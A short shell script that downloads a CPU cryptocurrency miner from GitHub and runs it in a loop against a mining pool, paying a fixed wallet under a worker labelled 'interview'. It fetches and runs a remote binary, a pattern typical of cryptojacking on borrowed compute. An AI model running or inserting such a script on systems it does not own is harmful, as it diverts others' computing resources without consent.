wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
while [ 1 ]; do
./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RTPHZdVDw46TvihRcZCcSMVLneCS1dPhtb.interview -p x --cpu 4
sleep 2
done
sleep 999
